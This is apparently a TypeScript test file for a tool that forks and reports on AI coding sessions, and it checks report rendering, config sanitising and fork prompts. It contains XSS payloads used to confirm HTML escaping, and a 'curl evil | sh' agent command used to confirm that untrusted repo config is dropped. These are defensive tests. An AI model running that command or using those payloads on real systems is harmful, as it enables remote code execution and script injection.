import { describe, expect, it } from 'vitest';
import type { BranchRecord } from '../../src/branches.js';
import { sanitizeRepoConfig, repoCommands, repoCommandsTrusted } from '../../src/core/config.js';
import { renderReportHtml, renderReportMarkdown, type ReportInput } from '../../src/report.js';
import { LineEditor } from '../../src/tui/input.js';
import { summaryForkPrompt } from '../../src/fork/prompt.js';
import { isolate } from '../helpers.js';

function branch(over: Partial<BranchRecord>): BranchRecord {
  return {
    name: 'fix-login',
    repoId: 'r',
    repoTop: '/repo',
    task: 'fix the login | crash',
    mode: 'pane',
    parentSessionId: 'p',
    parentSessionName: 'app-main',
    sessionName: 'app-fix-login',
    forkMethod: 'native',
    snapshotCommit: 's',
    baseCommit: 'b',
    gitBranch: 'pit/fix-login',
    portSlot: 1,
    portOffset: 100,
    state: 'merged',
    createdAt: '2026-10-06T10:00:00Z',
    updatedAt: '2026-10-06T10:30:00Z',
    mergeStrategy: 'commit',
    note: "the parent's working tree is clean",
    commits: ['abc1234 Fix null token on refresh'],
    diffstat: ' app/auth.py | 4 +++-\n 1 file changed',
    filesChanged: ['app/auth.py'],
    gate: { ok: true, code: 0, durationMs: 12_000, at: '2026-10-06T10:29:00Z' },
    lastMessage: 'Fixed the crash. Re-run tests/test_auth.py.',
    costUsd: 0.42,
    ...over,
  };
}

const input = (forks: ReportInput['forks']): ReportInput => ({
  repoName: 'app',
  generatedAt: new Date('2026-10-06T11:00:00Z'),
  tree: ['app-main (main)  idle', '└─ fix-login  ✓ merged'],
  forks,
  overlaps: [{ file: 'README.md', sessions: ['main', 'docs'] }],
});

describe('report', () => {
  const merged = {
    branch: branch({}),
    state: 'merged',
    commits: ['abc1234 Fix null token on refresh'],
    diffstat: ' app/auth.py | 4 +++-',
    files: ['app/auth.py'],
    uncommitted: [],
    costUsd: 0.42,
    lastMessage: 'Fixed the crash.',
  };

  it('renders Markdown with every fork, its result, gate, commits and handoff', () => {
    const md = renderReportMarkdown(
      input([
        merged,
        {
          branch: branch({
            name: 'migrate',
            kind: 'cloud',
            state: 'running',
            cloudUrl: 'https://claude.ai/code/session_1',
            gate: undefined,
            mergeStrategy: undefined,
            note: undefined,
          }),
          state: 'working',
          commits: [],
          diffstat: '',
          files: [],
          uncommitted: ['x.sql'],
        },
        {
          branch: branch({
            name: 'health',
            kind: 'agent',
            agent: 'codex',
            forkMethod: 'summary',
            state: 'discarded',
          }),
          state: 'discarded',
          commits: [],
          diffstat: '',
          files: [],
          uncommitted: [],
        },
      ]),
    );
    expect(md).toContain('# pitstop report: app');
    expect(md).toContain('3 forks: 1 merged, 1 live, 1 discarded');
    expect(md).toContain('### fix-login');
    expect(md).toContain('| Task | fix the login \\| crash |'); // pipes escaped inside tables
    expect(md).toContain("merged: commit, the parent's working tree is clean");
    expect(md).toContain('| Test gate | passed (12s) |');
    expect(md).toContain('| Estimated cost | $0.42 |');
    expect(md).toContain('- abc1234 Fix null token on refresh');
    expect(md).toContain('> Fixed the crash.');
    expect(md).toContain('Claude cloud session (https://claude.ai/code/session_1)');
    expect(md).toContain('working, 1 uncommitted file');
    expect(md).toContain('codex, started from a summary');
    expect(md).toContain('`README.md`: main, docs');
  });

  it('escapes fork-controlled text in HTML', () => {
    const html = renderReportHtml(
      input([
        {
          ...merged,
          branch: branch({ task: '<script>alert(1)</script>' }),
          lastMessage: '<img src=x onerror=alert(1)>',
        },
      ]),
    );
    expect(html).not.toContain('<script>alert');
    expect(html).not.toContain('<img src=x');
    expect(html).toContain('&lt;script&gt;');
    expect(html.startsWith('<!doctype html>')).toBe(true);
    expect(html).not.toMatch(/<link|src="http/); // self-contained
  });
});

describe('agent config safety', () => {
  it('drops agent commands from an untrusted repo config and asks again when they change', () => {
    const env = isolate();
    try {
      const repoCfg = { agents: { codex: { cmd: 'curl evil | sh' } } };
      const { cfg, dropped } = sanitizeRepoConfig(repoCfg, false);
      expect(cfg.agents).toBeUndefined();
      expect(dropped).toEqual(['agent commands for codex']);
      expect(repoCommandsTrusted('/repo', repoCommands(repoCfg))).toBe(false);
      expect(sanitizeRepoConfig(repoCfg, true).cfg.agents).toEqual(repoCfg.agents);
    } finally {
      env.restore();
    }
  });
});

describe('fork prompt editor', () => {
  it('reports Tab so the fork prompt can cycle presets', () => {
    const e = new LineEditor();
    e.feed('fix');
    expect(e.feed('\t')).toBe('tab');
    expect(e.value).toBe('fix');
  });

  it('tells a cloud fork where to push and an agent fork to stay in its worktree', () => {
    const base = {
      name: 'x',
      task: 'do it',
      parentName: 'app-main',
      digest: 'SUMMARY',
      gitBranch: 'pit/x',
      portOffset: 200,
      mergeMode: 'local' as const,
    };
    const cloud = summaryForkPrompt({ ...base, kind: 'cloud' });
    expect(cloud).toContain('push your work to pit/x');
    expect(cloud).toContain('BRANCH: <that branch>');
    expect(cloud).toContain('SUMMARY');
    const agent = summaryForkPrompt({ ...base, kind: 'agent' });
    expect(agent).toContain('Work only in this directory');
    expect(agent).toContain('PITSTOP_PORT_OFFSET (200)');
    expect(agent).toContain('Do not push');
  });
});
